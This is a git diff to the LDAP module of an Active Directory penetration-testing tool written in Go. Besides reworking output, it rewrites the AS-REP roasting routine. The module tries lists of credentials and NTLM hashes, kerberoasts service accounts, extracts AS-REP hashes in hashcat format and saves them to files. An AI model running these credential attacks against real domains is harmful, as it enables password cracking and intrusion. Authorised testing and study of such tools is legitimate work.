@@ -4,11 +4,10 @@ import (
 	"fmt"
 	"sync"
 
+	"github.com/5amu/goad/internal/printer"
 	"github.com/5amu/goad/internal/utils"
 	"github.com/5amu/goad/pkg/kerberos"
 	"github.com/5amu/goad/pkg/ldap"
-	"github.com/fatih/color"
-	"github.com/rodaine/table"
 )
 
 type LdapOptions struct {
@@ -159,17 +158,20 @@ func (o *LdapOptions) Run() (err error) {
 }
 
 func (o *LdapOptions) authenticate(ldapClient *ldap.LdapClient) (utils.Credential, error) {
+	prt := printer.NewPrinter("LDAP", ldapClient.Host, "", ldapClient.Port)
 	for _, creds := range o.credentials {
 		if creds.Hash != "" {
 			if err := ldapClient.AuthenticateNTLM(creds.Username, creds.Hash); err != nil {
-				fmt.Printf("[%s\\%s:%s] %v\n", o.Connection.Domain, creds.Username, creds.Hash, err)
+				prt.PrintFailure(creds.StringWithDomain(o.Connection.Domain))
 			} else {
+				prt.PrintSuccess(creds.StringWithDomain(o.Connection.Domain))
 				return creds, nil
 			}
 		} else {
 			if err := ldapClient.Authenticate(creds.Username, creds.Password); err != nil {
-				fmt.Printf("[%s\\%s:%s] %v\n", o.Connection.Domain, creds.Username, creds.Password, err)
+				prt.PrintFailure(creds.StringWithDomain(o.Connection.Domain))
 			} else {
+				prt.PrintSuccess(creds.StringWithDomain(o.Connection.Domain))
 				return creds, nil
 			}
 		}
@@ -196,34 +198,23 @@ func (o *LdapOptions) asreproast(target string) error {
 	}
 	krb5client.AuthenticateWithPassword(creds.Username, creds.Password)
 
-	tbl := initializeTable("Module", "Target", "Domain", ldap.SAMAccountName, ldap.ServicePrincipalName, "Hash")
+	prt := printer.NewPrinter("LDAP", target, "", lclient.Port)
 	var hashes []string
 	err = lclient.FindADObjectsWithCallback(ldapFilter, func(obj ldap.ADObject) error {
-		if len(obj.ServicePrincipalName) == 0 {
-			return nil
+		asrep, err := krb5client.GetAsReqTgt(obj.SAMAccountName)
+		if err != nil {
+			return err
 		}
-
-		for i, spn := range obj.ServicePrincipalName {
-			tgs, err := krb5client.GetServiceTicket(obj.SAMAccountName, spn)
-			if err != nil {
-				return err
-			}
-
-			hash := kerberos.TGSToHashcat(tgs.Ticket, obj.SAMAccountName)
-			tbl.AddRow("LDAP", target, o.Connection.Domain, obj.SAMAccountName, spn, fmt.Sprintf("%s...%s", hash[:30], hash[len(hash)-10:]))
-
-			if i == 0 {
-				hashes = append(hashes, hash)
-			}
-		}
+		hash := kerberos.ASREPToHashcat(*asrep.Ticket)
+		prt.Print(obj.SAMAccountName, fmt.Sprintf("%s...%s", hash[:30], hash[len(hash)-10:]))
+		hashes = append(hashes, hash)
 		return nil
 	})
 	if err != nil {
 		return err
 	}
 
-	tbl.Print()
-	fmt.Printf("\nSaving hashes to '%s'\n\n", o.Hashes.AsrepRoast)
+	prt.Print("Saving hashes to", o.Hashes.AsrepRoast)
 	return writeLines(hashes, o.Hashes.AsrepRoast)
 }
 
@@ -246,7 +237,7 @@ func (o *LdapOptions) kerberoast(target string) error {
 	}
 	krb5client.AuthenticateWithPassword(creds.Username, creds.Password)
 
-	tbl := initializeTable("Module", "Target", "Domain", ldap.SAMAccountName, ldap.ServicePrincipalName, "Hash")
+	prt := printer.NewPrinter("LDAP", target, "", lclient.Port)
 	var hashes []string
 	err = lclient.FindADObjectsWithCallback(ldapFilter, func(obj ldap.ADObject) error {
 		if len(obj.ServicePrincipalName) == 0 {
@@ -260,7 +251,7 @@ func (o *LdapOptions) kerberoast(target string) error {
 			}
 
 			hash := kerberos.TGSToHashcat(tgs.Ticket, obj.SAMAccountName)
-			tbl.AddRow("LDAP", target, o.Connection.Domain, obj.SAMAccountName, spn, fmt.Sprintf("%s...%s", hash[:30], hash[len(hash)-10:]))
+			prt.Print(obj.SAMAccountName, fmt.Sprintf("%s...%s", hash[:30], hash[len(hash)-10:]))
 
 			if i == 0 {
 				hashes = append(hashes, hash)
@@ -272,8 +263,7 @@ func (o *LdapOptions) kerberoast(target string) error {
 		return err
 	}
 
-	tbl.Print()
-	fmt.Printf("\nSaving hashes to '%s'\n\n", o.Hashes.Kerberoast)
+	prt.Print("Saving hashes to", o.Hashes.Kerberoast)
 	return writeLines(hashes, o.Hashes.Kerberoast)
 }
 
@@ -286,25 +276,11 @@ func (o *LdapOptions) enumeration(target string) error {
 		return err
 	}
 
-	tbl := table.New("Module", "Target", "Domain", ldap.SAMAccountName, ldap.PasswordLastSet, ldap.LastLogon, ldap.ServicePrincipalName)
-	tbl.WithHeaderFormatter(color.New(color.FgGreen, color.Underline).SprintfFunc()).WithFirstColumnFormatter(color.New(color.FgYellow).SprintfFunc())
-
-	err = lclient.FindADObjectsWithCallback(o.filter, func(obj ldap.ADObject) error {
-		tbl.AddRow(
-			"LDAP",
-			target,
-			o.Connection.Domain,
-			obj.SAMAccountName,
-			obj.PWDLastSet,
-			obj.LastLogon,
-			obj.ServicePrincipalName,
-		)
+	prt := printer.NewPrinter("LDAP", target, "", lclient.Port)
+	return lclient.FindADObjectsWithCallback(o.filter, func(obj ldap.ADObject) error {
+		prt.Print(obj.SAMAccountName, obj.Description)
 		return err
 	})
-	fmt.Println()
-	tbl.Print()
-	fmt.Println()
-	return err
 }
 
 func (o *LdapOptions) domainSID(target string) error {
@@ -316,16 +292,12 @@ func (o *LdapOptions) domainSID(target string) error {
 		return err
 	}
 
+	prt := printer.NewPrinter("LDAP", target, "", lclient.Port)
 	sid, err := lclient.GetDomainSID()
 	if err != nil {
 		return err
 	}
 
-	tbl := table.New("Module", "Target", "Domain", "SID")
-	tbl.WithHeaderFormatter(color.New(color.FgGreen, color.Underline).SprintfFunc()).WithFirstColumnFormatter(color.New(color.FgYellow).SprintfFunc())
-	tbl.AddRow("LDAP", target, o.Connection.Domain, sid)
-	fmt.Println()
-	tbl.Print()
-	fmt.Println()
+	prt.Print(sid)
 	return nil
 }
